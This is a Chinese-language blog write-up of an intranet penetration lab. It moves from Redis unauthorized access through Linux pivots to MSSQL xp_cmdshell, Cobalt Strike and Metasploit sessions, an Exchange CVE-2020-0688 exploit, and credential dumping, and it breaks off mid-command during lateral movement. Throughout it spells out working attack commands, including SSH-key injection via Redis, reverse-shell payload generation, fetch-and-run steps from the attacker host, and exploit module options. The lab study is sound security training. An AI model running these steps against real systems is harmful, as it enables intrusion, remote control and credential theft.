---
title: 小迪VPC3内网打靶全流程记录
cover: >-
  https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_l3gr.png
categories:
  - [Windows, vpc]
tags:
  - 内网渗透
  - 渗透测试
  - Redis
  - MSSQL
  - Exchange
  - CVE-2020-0688
  - 免杀
abbrlink: b8e3f9c1
date: 2026-05-08 16:30:00
---
# 小迪VPC3内网打靶全流程记录

> 难度评分：8 | 难度等级：中级
> 考核内容：从外网打到内网域，拿下所有靶场权限
> 主要技术：Redis攻防、Linux横向、MSSQL提权、Exchange攻防、免杀对抗

---

## 目录

- [环境配置](#一环境配置)
- [外网打点：Redis 未授权 → SSH 公钥写入](#二外网打点redis-未授权--ssh-公钥写入)
- [第一层内网：52 网段信息收集](#三第一层内网52-网段信息收集)
- [第二层内网：93 网段 + MSF 路由代理](#四第二层内网93-网段--msf-路由代理)
- [MSSQL 入口：SRV-WEB-KIT 落地](#五mssql-入口srv-web-kit-落地)
- [CS 上线、提权、域内信息收集](#六cs-上线提权域内信息收集)
- [打 Exchange：CVE-2020-0688](#七打-exchangecve-2020-0688)
- [横向到 DF：免杀 + AMSI 绕过](#八横向到-df免杀--amsi-绕过)
- [总结](#九总结)

---

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_l3gr.png)

## 一、环境配置

### 虚拟机网卡设置

**VM网卡配置**：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_tt8l.png)

本机保留一个网卡用于通信，其他 3 个关闭。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_43kx.png)

靶场一共5台机器，分布在不同网段：

| 机器                     | 系统         | 角色                   |
| ------------------------ | ------------ | ---------------------- |
| Ubuntu 64位 (Web 1)      | Linux        | 外网跳板，Redis服务    |
| Ubuntu 64位 (Web 2)      | Linux        | 内网跳板               |
| 2012 R2 Srv-Web          | Windows 2012 | Web服务器，MSSQL       |
| Windows 10 x64 DF        | Windows 10   | 域内工作站，有Defender |
| 2012 Exchange2013 Srv-DC | Windows 2012 | 域控 + Exchange        |

**虚拟机网卡配置**：

Ubuntu 64 位 (Web 1)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508160750456.png)

Ubuntu 64 位 (Web 2)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508160805232.png)

2012 R2 Rootkit.org Srv-Web

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508160818144.png)

Windows 10 x64-DF 的克隆

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508160835584.png)

2012 x64 Exchange2013Sp1 Rootkit.org Srv-DC

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508160847232.png)

**服务启动**：

Ubuntu 64 位 (Web 1)

机器密码：`web2021`

启动环境：

```bash
# 切换 root
sudo -i
# 如需输入密码就是 web2021
# 启动 redis 服务
redis-server /etc/redis.conf
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_rkpf.png)

```bash
# 关闭防火墙
iptables -F
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508164011512.png)

Ubuntu 64 位 (Web 2)

机器密码：`ubuntu`

```bash
sudo -i
# 密码 ubuntu
iptables -F
```

---

## 二、外网打点：Redis 未授权 → SSH 公钥写入

### 信息收集

先确认 Kali 自己的 IP，是 `192.168.1.129`，然后 nmap 扫一下整个网段找目标。

```bash
nmap 192.168.1.0/24
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_3io7.png)

找到目标了，`192.168.1.128`，然后对它做详细扫描：

```bash
nmap -A -p- 192.168.1.128
```

> **参数说明**
> - `-A`：全能扫描模式，一次性包含操作系统探测、版本探测、脚本扫描、路由追踪，扫得最全面。
> - `-p-`：扫描全部 0~65535 所有端口，默认 nmap 只扫常用 1000 个端口，加 `-p-` 是全端口暴力扫。
> - `192.168.1.0/24`：扫描整个 192.168.1.x 局域网范围（.1 ~ .254）。

**扫描结果：**

| 端口 | 服务 | 版本信息 |
| --- | --- | --- |
| **22/tcp** | SSH | OpenSSH 7.6p1 (Ubuntu) |
| **80/tcp** | HTTP | nginx 1.14.0 (Ubuntu) |
| **81/tcp** | HTTP | nginx 1.14.0 (Ubuntu) - 返回 502 Bad Gateway |
| **6379/tcp** | Redis | Redis key-value store 2.8.17 |

重点关注 6379 端口，Redis 版本 2.8.17 比较老，而且 OS 信息显示是 Linux 内核 4.15~5.19，大概率存在 Redis 未授权访问。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_cknj.png)

这些意思是可能存在这些漏洞，但是没有验证成功

### Redis 未授权确认

直接用工具尝试无密码未授权连接：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_toew.png)

果然连上了。执行 `config get dir` 看一下：

```bash
config get dir
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_vgre.png)

返回 `/root`。普通用户根本没权限访问 `/root` 目录，能返回这个路径说明 Redis 是跑在 root 权限下的。

### Redis 未授权写 SSH 公钥

既然 Redis 是 root 权限，那思路就清晰了——把自己的 SSH 公钥通过 Redis 写进 `/root/.ssh/authorized_keys`，然后直接 SSH 免密登录。

**第一步：Kali 生成 SSH 密钥对**

```bash
ssh-keygen -t rsa -f ~/.ssh/id_rsa
```

> - `ssh-keygen`：生成 SSH 密钥对的工具
> - `-t rsa`：指定密钥类型为 RSA（最常用的加密算法）
> - `-f ~/.ssh/id_rsa`：指定保存路径，会生成：
>   - `~/.ssh/id_rsa` → 私钥（自己留着）
>   - `~/.ssh/id_rsa.pub` → 公钥（写进目标）

遇到提示全部回车就行，不用设密码。

**第二步：把公钥处理成 Redis 能接受的格式**

```bash
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > /tmp/key.txt
```

> **为什么要加 `\n\n`？**
>
> Redis 在保存数据到文件时，会在内容前后加一些自己的格式数据（类似文件头和文件尾）。如果公钥紧贴着这些"杂质"数据，SSH 读取 `authorized_keys` 时会解析失败。
>
> 前后加 `\n\n`（空行），是为了把公钥和 Redis 的杂质数据隔开，确保 SSH 能干净地读到公钥内容：
>
> ```
> [Redis杂质数据]
>
> ssh-rsa AAAA...你的公钥
>
> [Redis杂质数据]
> ```
>
> 中间空行隔开，SSH 就能正确识别了。

**第三步：把公钥推进 Redis**

```bash
cat /tmp/key.txt | redis-cli -h 192.168.1.128 -x set xxx
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_fems.png)

返回 `OK`，公钥已经存进 Redis 数据库里了。注意这一步只是暂存在 Redis 内存里（键名叫 `xxx`），还没写到文件系统。

**第四步：连接 Redis 设置写入路径并保存**

```bash
redis-cli -h 192.168.1.128
config set dir /root/.ssh
config set dbfilename authorized_keys
save
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_nqie.png)

全部 OK，写入成功。

> **整个逻辑梳理一下：**
>
> - `set xxx` → 把公钥存进 Redis 内存
> - `config set dir /root/.ssh` → 指定保存到哪个目录
> - `config set dbfilename authorized_keys` → 指定文件名
> - `save` → 把内存里所有数据（包括公钥）写进 `/root/.ssh/authorized_keys`
>
> Redis 本来设计这个功能是为了数据备份，结果被拿来写任意文件了，这就是这个漏洞的本质。
>
> `authorized_keys` 文件里虽然会混入一些 Redis 的杂质数据，但没关系——SSH 读取这个文件时会逐行扫描，找到符合公钥格式（`ssh-rsa AAAA...`）的行就认，其他杂质行直接忽略。这也是前后加 `\n\n` 的原因，让公钥单独成行更容易被识别。

**第五步：SSH 登录**

```bash
ssh root@192.168.1.128
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_526g.png)

输 `yes` 确认，成功拿下主机。

---

## 三、第一层内网：52 网段信息收集

### 发现新网段

登进去之后看 IP，发现了新网段 `192.168.52.x`。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_3kyp.png)

机器上没有 nmap，不能直接扫存活 IP。先试试外网：

```bash
ping baidu.com
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_bbru.png)

好消息是可以访问外网，有一条下载工具的后路。先用 arp 看看有没有缓存记录：

```bash
arp -a
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_1lzx.png)

发现了！`192.168.52.20` 就是内网里的第二台机器。

### 翻历史命令找线索

```bash
cat ~/.bash_history
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_azgt.png)

找到了一条直接 SSH 连接的命令，试了一下：

```bash
ssh 192.168.52.20
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_y7eq.png)

直接连上了，没有密码，应该是两台机器之间配置了信任关系（共用了 SSH 密钥）。

> **怎么证明是两台不同的机器？**
>
> 看 `uname -a`：
>
> 第一台机器：
> ![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_5vbg.png)
>
> 第二台机器：
> ![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_bik7.png)
>
> 虽然环境名显示一样，但内核信息不同，确实是两台独立的机器。

### 第二台机器信息收集

```bash
ip a
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_zoku.png)

IP 很多，重点只有两个：

- `eth0` → `192.168.52.20`，连着第一台 Linux
- `eth1` → `192.168.93.10`，这是新网段！
- `172.x.x.x` 那些是 Docker 虚拟网卡，暂时不管

机器上依旧没有 nmap，而且是内网机器不能访问外网。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_d87p.png)

```bash
arp -a
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_yms8.png)

arp 缓存里没有 93 网段的记录，再翻历史命令找找：

```bash
cat ~/.bash_history
```

找到了：

```bash
ping 192.168.93.128
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_wh3x.png)

可以通讯，`93.128` 就是在同一个内网里。还找到了一条：

```bash
rdesktop -u micle -p admin 192.168.92.30
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_x8xm.png)

这个不知道是小迪做实验留下的还是故意埋的，直接输入发现没有 rdesktop 这个工具，先记着。

查看端口信息：

```bash
netstat -tulnp
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_rrdu.png)

什么都没有，只有一个 SSH，感觉没啥能直接利用的了。

### 传工具：通过中转下载 fscan

因为第二台机器在内网不能直接访问外网，需要先在第一台主机下载工具，再用 Python 起一个 HTTP 服务来中转。

**第一台 Linux（192.168.52.10）上操作：**

```bash
wget https://github.com/shadow1ng/fscan/releases/download/v2.1.2/fscan_2.1.2_linux_x64
chmod +x fscan_2.1.2_linux_x64
python3 -m http.server 8888
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_gfnd.png)

**第二台 Linux（192.168.52.20）上下载：**

```bash
wget http://192.168.52.10:8888/fscan_2.1.2_linux_x64
chmod +x fscan_2.1.2_linux_x64
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_nmgo.png)

### 扫 93 网段

```bash
./fscan_2.1.2_linux_x64 -h 192.168.93.0/24
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_mamm.png)

没扫到目标（只有自己）。提示 ICMP 响应率过低（0.4%），ICMP 就是 ping 用的协议，Windows 防火墙默认会屏蔽 ping，很有可能被拦了。

跳过 ICMP 探测，直接扫端口, 并降低线程：

```bash
./fscan_2.1.2_linux_x64 -h 192.168.93.128 -t 50
```

> 其实后来才知道，`93.128` 这台机器内部 IP 被改成了固定的，所以扫不到。把它改成自动分配（DHCP）之后就可以扫到了。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_whdp.png)

`192.168.93.128` 有两个重要服务：

- **81 端口** → IIS Web 服务，协同管理系统
- **1433 端口** → MSSQL 数据库

---

## 四、第二层内网：93 网段 + MSF 路由代理

发现 93.128 有 Web 服务，但网络不同，不能直接访问。而且还要跨两层网络，需要代理/隧道技术。这里决定用 MSF 来处理路由和代理。

### 让第一台 Linux 上线 MSF

**生成 payload：**

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.129 LPORT=1111 -f elf > 1.elf
python3 -m http.server 80
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165110969.png)

**Kali 上启动监听：**

```bash
msfconsole
use exploit/multi/handler
set payload linux/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.129
set LPORT 1111
run
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165139133.png)

**第一台 Linux 上下载执行：**

```bash
wget http://192.168.1.129/1.elf
chmod +x 1.elf
./1.elf &
```

& : 后台运行不占用终端会话

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165200665.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165223344.png)

成功下载

MSF 拿到 session 后，添加路由：

快速添加 52 段的路由

```bash
run post/multi/manage/autoroute
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165253723.png)

### 让第二台 Linux 上线 MSF

因为第二台机器在内网，如果选反向上线，反向的 IP 只能指向第一台 Linux（不能直接指向 Kali），然后还需要第一台 Linux 做端口转发，比较麻烦。所以选择**正向上线（bind_tcp）**，反正没有防火墙阻拦。

因为已经添加了路由，MSF 会自动处理流量，经过第一台主机转发到第二台：

```
Kali → MSF路由 → 第一台Linux → 第二台Linux(bind端口)
```

**生成正向 payload：**

```bash
msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=1112 -f elf > 2.elf
```

文件中转流程（需要过两次）：

```
Kali 开HTTP → 第一台Linux下载2.elf → 第一台Linux开HTTP → 第二台Linux下载2.elf
```

**Kali 开 HTTP 服务：**
```bash
python3 -m http.server 80
```

**第一台 Linux 下载并中转：**
```bash
wget http://192.168.1.129/2.elf
chmod +x 2.elf
python3 -m http.server 8888
```

**第二台 Linux 下载执行：**
```bash
wget http://192.168.52.10:8888/2.elf
chmod +x 2.elf
./2.elf &
```

**MSF 上主动连接：**
```bash
use exploit/multi/handler
set payload linux/x64/meterpreter/bind_tcp
set RHOST 192.168.52.20
set LPORT 1112
run
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165527732.png)

成功拿下 session 8、9，两台机器都上线了。

进入 session 9（第二台 Linux），添加 93 网段路由：

```bash
sessions 9
run post/multi/manage/autoroute
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165547167.png)

用 `route print` 查看路由配置：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165600984.png)

- Session 8（第一台 Linux）→ 处理 1.x 和 52.x 网段
- Session 9（第二台 Linux）→ 处理 93.x 和 172.x 网段

### 开 SOCKS 代理访问 93 网段

```bash
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run
```

然后配置 proxychains：

```bash
vim /etc/proxychains4.conf
# 找到最后一行，确认是：
socks5 127.0.0.1 1080
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165641379.png)

测试一下：

```bash
# 不用代理（访问不到）
curl http://192.168.93.128:81

# 用代理（能访问）
proxychains curl http://192.168.93.128:81
```

可以看到，不使用代理是访问不到的，使用了代理就能成功访问得到

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165700497.png)

本机浏览器也配置一下代理插件

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165736743.png)

启动插件访问 , 用浏览器访问 `192.168.93.128:81`。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165751143.png)

网络通讯没有问题

### 发现 OA 系统

访问之后发现是**协同办公 v6.3 OA 系统**，经过查询这应该不是主流 CMS

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508165828309.png)

先扫一下目录：

```bash
# 不能直接这样扫，会把 MSF 会话扫崩
# proxychains dirsearch -u http://192.168.93.128:81

# 需要限制线程
proxychains dirsearch -u http://192.168.93.128:81 -t 50 -x 404,405,403
```

> **注意：** proxychains 每个请求都会打印一行日志，看起来很乱。可以关掉日志输出：
> ```bash
> vim /etc/proxychains4.conf
> # 找到 quiet_mode 这行，去掉注释 #
> ```

结果就是扫着扫着 MSF 直接崩了，又要重新上线。而且内存也不够了，索性和前面一样下线这两台了,  就直接跳过去看 wp，发现有备份源码：

```
http://192.168.93.128:81/www.rar
```

下载下来只有一个文件 `Job18.config`

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170141679.png)

里面有 MSSQL 的凭据：

```
mssql
sa:admin
```

`sa` 是 SQL Server 的系统管理员账号，相当于数据库里的 root，是 SQL Server 内置的最高权限账号。

---

## 五、MSSQL 入口：SRV-WEB-KIT 落地

### 用 socat 中转端口连接 MSSQL

Windows 直接连不到 `192.168.93.128:1433`，可以在 Kali 上建一个 socat 转发：

```bash
socat TCP-LISTEN:1433,fork TCP:192.168.93.128:1433
```

然后 Windows 上的数据库工具连接 `192.168.1.129:1433`，流量会自动转发到 `192.168.93.128:1433`。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170357441.png)

右下角显示连接成功

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170414732.png)

权限是 DBA（Database Administrator，数据库管理员，即最高权限）。

### xp_cmdshell 执行系统命令

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170442581.png)

MSSQL 有几种执行系统命令的方式：

| 方式 | 说明 |
| --- | --- |
| XpCmdshell | 最经典，直接调用 `xp_cmdshell` 存储过程，默认关闭需要激活 |
| AgentJob | 通过 SQL Server 代理作业执行命令，可绕过 xp_cmdshell 限制 |
| CLR | 通过 .NET 公共语言运行时执行命令，更隐蔽 |
| SpOACreate (COM 组件) | 通过 OLE 自动化对象执行命令 |

这些都是 MSSQL 特有的，MySQL/Oracle 没有，这也是为什么 MSSQL 在渗透中特别"好用"。

激活 xp_cmdshell 需要 sa 权限，激活完之后执行：

```sql
exec xp_cmdshell 'whoami'
```

返回：

```
rootkit\dbadmin
```

是域用户，说明是域环境。

### 收集机器信息

```bash
systeminfo
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170533282.png)

重点信息：

- 域：`rootkit.org` 
- 机器名：`SRV-WEB-KIT`，是成员服务器，不是域控
- 有两块网卡：`192.168.93.128` 和 `192.168.3.128` → 又发现一个新网段

---

## 六、CS 上线、提权、域内信息收集

### CS 上线

先尝试 PowerShell 上线，好像因为命令太长解析出错了。改用 exe 文件上线：在工具里建立一个监听器（选目标机器能够回连的 IP）

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170613154.png)

然后直接上传 exe 后门文件执行：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170627633.png)

```bash
C:/wwwroot/beacon.exe
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170652078.png)

上线成功。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170704301.png)

```bash
shell whoami
# rootkit\dbadmin，域用户权限，不是 System，权限比较低
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170719881.png)

### 提权

直接用 CS 内置命令：

```bash
getsystem
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170748265.png)

提权成功。顺便用 mimikatz 抓一下密码。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170809286.png)

### 域内信息收集

**扫描目标：**

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170823359.png)

- `192.168.3.74` → DF（Windows 10 PC，有 Defender）
- `192.168.3.144` → OWA2013（Exchange 服务器）
- `192.168.93.128` → 当前机器（SRV-WEB-KIT）

**判断 DC：**

扫描一下端口

`192.168.3.144` 开放的端口：

- 25、587 → SMTP（邮件发送）
- 143、993 → IMAP（邮件接收）
- 443 → HTTPS（OWA）
- **88 → Kerberos**
- **389 → LDAP**
- **53 → DNS**

有 88（Kerberos）、389（LDAP）、53（DNS），而且主机名叫 OWA2013，OWA 就是 Outlook Web App，可以直接判断这是 Exchange 服务器，并且很可能也是 DC。

**确认 DC：**

```bash
shell net time /domain
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508170926150.png)

返回 `\\OWA2013.rootkit.org`，说明：

- 当前处于 `rootkit.org` 这个 Active Directory 域中
- 主域控制器（PDC）的主机名就叫 `OWA2013`

**枚举域内所有 SPN：**

```bash
shell setspn -T rootkit.org -q */*
```

> **setspn 说明：**
>
> - 是 Windows 自带工具，全称 "Set Service Principal Name"（设置服务主体名称）
> - `-T rootkit.org`：指定查询目标域
> - `-q */*`：查询所有 SPN（通配符匹配所有服务类型和主机名）
>
> **合起来的意思**：连接到 rootkit.org 这个域，查询并列出所有注册的服务主体名称。

低权限直接报错：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_jbb0.png)

提权后执行成功：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_ufn9.png)

> **关于 SPN 结果里的 LDAP 路径解读：**
>
> LDAP 路径结构：`CN=名字,OU=组织单位,DC=域组件,DC=域组件`
>
> 例如 `DC=rootkit,DC=org` 就是域名 `rootkit.org`。
>
> CN 不一定是机器名称，怎么判断是机器还是用户？看 OU：
>
> | 路径特征 | 对象类型 |
> | --- | --- |
> | `OU=Domain Controllers` | ✅ 机器（域控） |
> | `CN=Computers` | ✅ 机器（普通计算机） |
> | `CN=Users` | ✅ 用户 |
>
> **域内各目标的攻击价值：**
>
> | DN | 是什么 | 攻击价值 |
> | --- | --- | --- |
> | OWA2013 | 域控 + Exchange | 🔴 极高 |
> | krbtgt | Kerberos 金票账户 | 🔴 高（拿到哈希后） |
> | dbadmin | 用户 + SQL 服务账户 | 🔴 极高（立刻可打） |
> | SRV-WEB-KIT | Web + WinRM | 🟡 横向入口 |
> | PC-*-KIT | 普通工作站 | 🟢 凭据回收站 |
> | DF | 未知主机 | 🟡 待探测 |

---

## 七、打 Exchange：CVE-2020-0688

### OWA 登录验证

确认 DC 的 IP：

```bash
shell ping OWA2013
# 来自 192.168.3.144 的回复: 字节=32 时间<1ms TTL=128
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_1lxs.png)

通过 SOCKS 代理，配置浏览器插件，访问 `192.168.3.144`：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_93tj.png)

用 `rootkit\dbadmin / admin!@#45` 登录成功：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_dfix.png)

### CVE-2020-0688 漏洞利用

扫描结果里主机名叫 OWA2013，说明是 Exchange 2013。CVE-2020-0688 正好是 Exchange 2013/2016/2019 的高危 RCE 漏洞，影响范围广。

先尝试 MSF 打：

```bash
search CVE-2020-0688
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_xw90.png)

找到了一个模块。`use 0` 进入，`show options` 看参数：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_9e19.png)

需要配置：

- `RHOSTS` → `192.168.3.144`
- `USERNAME` → `rootkit\dbadmin`
- `PASSWORD` → `admin!@#45`
- `DOMAIN` → `rootkit.org`

但有个问题，MSF 不能直接连 `192.168.3.144`，socks 代理也有点问题，所以决定用 CS 转 MSF 的方式处理路由。

**CS 派生会话给 MSF：**

在 CS 里建立一个派生监听器，IP 选目标主机能够回连到 Kali 的网段 IP（`192.168.93.129`）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_0rae.png)

MSF 开监听接收：

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST 192.168.93.129
set LPORT 4444
run
```

CS 里执行 `spawn msf` 派生：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_obvy.png)

添加路由：

```bash
run post/multi/manage/autoroute
background
```

然后打 CVE-2020-0688，结果利用失败，卡在获取 ViewState 页面：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_xpqu.png)

说明 MSF 的请求还是到不了 `192.168.3.144`。于是去网上下了一个 Python 版的 exp：

```bash
proxychains python3 cve-2020-0688.py -s https://192.168.3.144/owa/ -u 'rootkit.org\dbadmin' -p 'admin!@#45' -c "whoami"
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_f76g.png)

还是不行，卡在 `ASP.NET_SessionId` 获取阶段。怀疑是靶机问题，重启了一下，确实通了：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_pnmu.png)

按照步骤生成反序列化数据：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_0coq.png)

但是返回 500。试了几次都不行。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_ztsq.png)

然后就是各种排查：排除了防火墙，排除了通讯问题。又发现新问题——SSL 证书太老了，浏览器访问不了，换火狐浏览器解决了，但 exp 本身有问题。

各种 payload 问题折腾了一圈……



最终发现 MSF 内置的模块可以打通，思路是：先 CS >> MSF 建路由，再用 MSF 的 exchange 模块打。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_ca46.png)

```bash
# CS 转 MSF
use exploit/multi/handler
set payload windows/meterpreter/reverse_http
set LHOST 192.168.93.129
set LPORT 4444
run
```

```bash
# 获得 session 1，添加路由
run post/multi/manage/autoroute
background

# 打 Exchange
use exploit/windows/http/exchange_ecp_viewstate
set target 1
set payload windows/x64/meterpreter/bind_tcp
set RHOSTS 192.168.3.144
set USERNAME micle
set PASSWORD Admin12345
set DOMAIN rootkit.org
set SSL true
set RPORT 443
set LPORT 9999
set CMDSTAGER::FLAVOR certutil
run
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_ewrt.png)

太折磨了，但最终还是打通了。

### 抓凭据

```bash
load kiwi
creds_all
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_gdun.png)
![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_xyel.png)

> `load kiwi` 是在 meterpreter 里加载 mimikatz 模块，kiwi 就是 mimikatz 的 MSF 版本。
> `creds_all` 抓取当前机器上所有凭据，包括明文密码、NTLM hash、Kerberos 票据。

整理有价值的凭据：

**明文密码（最有用）：**
- `Administrator : admin!@#45` → **域管理员！**
- `micle : Admin12345` → 普通域用户
- `dbadmin : admin!@#45` → 之前已知

**NTLM Hash（有明文了用处不大，但留着）：**
- `Administrator : 518b98ad4178a53695dc997aa02d455c`
- `micle : ccef208c6485269c20db2cad21734fe7`

> **各种 hash 格式说明：**
>
> - `LM`：老旧的 Windows 密码 hash，Vista 之后基本废弃，很容易破解
> - `NTLM`：现在 Windows 主流的密码 hash 格式，PTH（哈希传递攻击）用的就是这个
> - `SHA1`：密码的 SHA1 哈希，Kerberos 相关
> - `wdigest`：Win10 之前默认会在内存里保存明文密码，所以能抓到 `Administrator: admin!@#45`，Win10 之后微软默认关闭了
> - `tspkg`：远程桌面（RDP）相关的凭据存储，也可能包含明文密码
> - `kerberos`：Kerberos 认证协议的凭据，包含域内票据，PTT（票据传递攻击）用的就是这里的票据
>
> **一句话总结：** wdigest 和 tspkg 是明文密码的来源，NTLM 是 PTH 的来源，kerberos 是 PTT 的来源。

---

## 八、横向到 DF：免杀 + AMSI 绕过

### 确认 DF 机器

DF 的 IP 之前是 `192.168.3.74`，这里 IP 变了变成了 `192.168.3.131`（靶机重启后 DHCP 重新分配了）。之前 fscan 扫描结果显示：

```
192.168.3.131:445 (platform: 500 version: 10.0 name: DF domain: ROOTKIT)
```

配置好 SOCKS 代理，用 crackmapexec 验证凭据：

```bash
crackmapexec smb 192.168.3.74 -u administrator micle dbadmin -p 'admin!@#45' 'Admin12345' 'admin!@#45' -d rootkit.org
```

>域管理员账号（Administrator）可以登录域内所有机器，有管理员权限；
>
>普通域用户（micle、dbadmin）只能登录自己有权限的机器。

利用账号密码尝试正向上线 CS：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_n56u.png)

上线失败：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_gt2w.png)

错误 225 是 `ERROR_EXE_MACHINE_TYPE_MISMATCH` 或者被安全软件拦截。结合拓扑图里 DF 旁边有 Windows Defender 图标，基本可以确定是 Defender 把 payload 杀了。

### WMIEXEC / PSEXEC 验证可通

先用 Kali 里的 impacket 组件测试，发现可以拿到 shell：

**WMIEXEC（真正无文件执行）：**
```bash
proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
rootkit.org/administrator:'admin!@#45'@192.168.3.131
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_fpiw.png)

**PSEXEC（会上传 exe）：**
```bash
